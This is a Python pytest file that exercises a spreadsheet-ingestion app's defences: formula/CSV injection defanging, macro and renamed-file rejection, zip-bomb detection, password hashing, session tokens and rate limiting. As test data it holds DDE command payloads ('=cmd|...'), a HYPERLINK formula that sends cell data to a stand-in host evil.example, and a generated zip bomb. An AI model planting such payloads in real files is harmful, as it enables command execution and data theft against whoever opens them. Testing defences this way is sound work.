"""
test_security.py — the defences, exercised against real hostile input.

Each test builds an actual attack payload rather than asserting on a flag, so a
refactor that quietly disables a check fails here instead of in production.
"""

from __future__ import annotations

import io
import zipfile

import pytest

from app.ingestion.paste import parse_paste
from app.ingestion.sanitize import MAX_CELL_LEN, MAX_DATA_ROWS
from app.ingestion.upload import (
    MAX_FILE_BYTES,
    UploadRejected,
    parse_upload,
)
from app.security.auth import (
    generate_secret,
    hash_password,
    issue_session,
    verify_password,
    verify_session,
)
from app.security.ratelimit import RateLimiter


# ---------------------------------------------------------------------------
# Formula / CSV injection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "payload",
    [
        "=cmd|'/c calc'!A1",
        "+1+1",
        "-2+3",
        "@SUM(1:1)",
        '=HYPERLINK("http://evil.example/?x="&A1,"click")',
    ],
)
def test_injection_cells_are_defanged(payload: str) -> None:
    table = parse_paste(f"City\tNote\nIasi\t{payload}")
    cell = table.rows[0][1]

    assert cell.startswith("'"), f"cell was not defanged: {cell!r}"
    assert table.report.injection_cells, "defanging was not reported to the user"


def test_ordinary_cells_are_not_defanged() -> None:
    """A negative number is not an attack. Over-defanging corrupts real data."""
    table = parse_paste("City\tPrice\nIasi\t100")
    assert table.rows[0][1] == "100"
    assert not table.report.injection_cells


def test_control_characters_are_stripped() -> None:
    table = parse_paste("City\tName\nIasi\tAn\x00na\x07")
    assert "\x00" not in table.rows[0][1]
    assert "\x07" not in table.rows[0][1]


def test_oversized_cell_is_truncated() -> None:
    table = parse_paste("City\tNote\nIasi\t" + "x" * (MAX_CELL_LEN + 500))
    assert len(table.rows[0][1]) <= MAX_CELL_LEN
    assert table.report.warnings


def test_row_limit_truncates_with_a_notice() -> None:
    rows = "\n".join(f"City{i}\t{i}" for i in range(50))
    table = parse_paste("City\tPrice\n" + rows)

    assert len(table.rows) == MAX_DATA_ROWS
    assert table.report.truncated_rows
    assert any("first" in w for w in table.report.warnings), "truncation was silent"


# ---------------------------------------------------------------------------
# Upload validation
# ---------------------------------------------------------------------------

def _xlsx_bytes(rows: list[list], extra_members: dict[str, bytes] | None = None) -> bytes:
    openpyxl = pytest.importorskip("openpyxl")
    workbook = openpyxl.Workbook()
    sheet = workbook.active
    for row in rows:
        sheet.append(row)

    buffer = io.BytesIO()
    workbook.save(buffer)
    data = buffer.getvalue()

    if not extra_members:
        return data

    # Re-pack with the extra members, to simulate a tampered workbook.
    source = zipfile.ZipFile(io.BytesIO(data))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as archive:
        for item in source.infolist():
            archive.writestr(item, source.read(item.filename))
        for name, content in extra_members.items():
            archive.writestr(name, content)
    return out.getvalue()


def test_valid_xlsx_is_parsed() -> None:
    data = _xlsx_bytes([["City", "Price"], ["Chisinau", 100], ["Iasi", 200]])
    table = parse_upload("sample.xlsx", data)

    assert table.headers == ["City", "Price"]
    assert table.types[1] == "number"
    assert table.report.source == "xlsx"


def test_xlsx_containing_macros_is_rejected() -> None:
    data = _xlsx_bytes(
        [["City", "Price"], ["Iasi", 10]],
        extra_members={"xl/vbaProject.bin": b"\x00macro payload"},
    )
    with pytest.raises(UploadRejected, match="macros"):
        parse_upload("looks_innocent.xlsx", data)


def test_macro_extension_is_rejected_by_name() -> None:
    with pytest.raises(UploadRejected, match="macros"):
        parse_upload("book.xlsm", b"PK\x03\x04whatever")


def test_renamed_file_is_caught_by_its_bytes() -> None:
    """A .csv that is actually a zip, and an .xlsx that is not one."""
    with pytest.raises(UploadRejected):
        parse_upload("data.csv", b"PK\x03\x04" + b"\x00" * 100)
    with pytest.raises(UploadRejected):
        parse_upload("data.xlsx", b"City,Price\nIasi,100\n")


def test_zip_bomb_is_rejected_before_extraction() -> None:
    """A small archive whose members expand enormously."""
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", b"<Types/>")
        archive.writestr("bomb.bin", b"\x00" * (80 * 1024 * 1024))

    with pytest.raises(UploadRejected, match="unreasonable size"):
        parse_upload("bomb.xlsx", out.getvalue())


def test_oversized_upload_is_rejected() -> None:
    with pytest.raises(UploadRejected, match="larger than"):
        parse_upload("big.csv", b"x" * (MAX_FILE_BYTES + 1))


def test_empty_upload_is_rejected() -> None:
    with pytest.raises(UploadRejected):
        parse_upload("empty.csv", b"")


def test_unsupported_extension_is_rejected() -> None:
    with pytest.raises(UploadRejected, match="Only .xlsx and .csv"):
        parse_upload("notes.txt", b"City,Price\nIasi,100\n")


def test_csv_upload_is_parsed_and_sanitised() -> None:
    table = parse_upload("data.csv", b'City,Note\nIasi,=cmd|calc\n')
    assert table.headers == ["City", "Note"]
    assert table.rows[0][1].startswith("'")
    assert table.report.injection_cells


def test_csv_with_semicolons_is_parsed() -> None:
    """Excel on a Romanian locale exports semicolon-separated CSV."""
    table = parse_upload("data.csv", "City;Price\nChișinău;100\n".encode())
    assert table.headers == ["City", "Price"]
    assert len(table.rows) == 1


# ---------------------------------------------------------------------------
# Admin authentication
# ---------------------------------------------------------------------------

def test_password_round_trip() -> None:
    stored = hash_password("correct horse battery staple")
    assert verify_password("correct horse battery staple", stored)
    assert not verify_password("wrong password", stored)


def test_password_hash_does_not_contain_the_password() -> None:
    stored = hash_password("hunter2")
    assert "hunter2" not in stored


def test_hashes_differ_for_the_same_password() -> None:
    """Random salt: two identical passwords must not produce identical hashes."""
    assert hash_password("same") != hash_password("same")


def test_session_token_round_trip() -> None:
    secret = generate_secret()
    token = issue_session(secret)
    assert verify_session(secret, token)


def test_session_token_cannot_be_forged() -> None:
    token = issue_session(generate_secret())
    assert not verify_session(generate_secret(), token), "token verified under the wrong secret"


def test_tampered_session_token_is_rejected() -> None:
    secret = generate_secret()
    body, signature = issue_session(secret).split(".", 1)
    assert not verify_session(secret, f"{body}x.{signature}")
    assert not verify_session(secret, f"{body}.{signature}x")


@pytest.mark.parametrize("token", ["", "garbage", "a.b.c", "...", "x." * 50])
def test_malformed_tokens_are_rejected_without_raising(token: str) -> None:
    assert not verify_session(generate_secret(), token)


# ---------------------------------------------------------------------------
# Rate limiting
# ---------------------------------------------------------------------------

def test_rate_limiter_blocks_after_the_budget() -> None:
    limiter = RateLimiter(max_requests=3, window_seconds=60)

    for _ in range(3):
        allowed, _ = limiter.check("1.2.3.4")
        assert allowed

    allowed, retry_after = limiter.check("1.2.3.4")
    assert not allowed
    assert retry_after > 0


def test_rate_limiter_counts_clients_separately() -> None:
    limiter = RateLimiter(max_requests=1, window_seconds=60)
    assert limiter.check("1.1.1.1")[0]
    assert limiter.check("2.2.2.2")[0], "one client's usage blocked another"
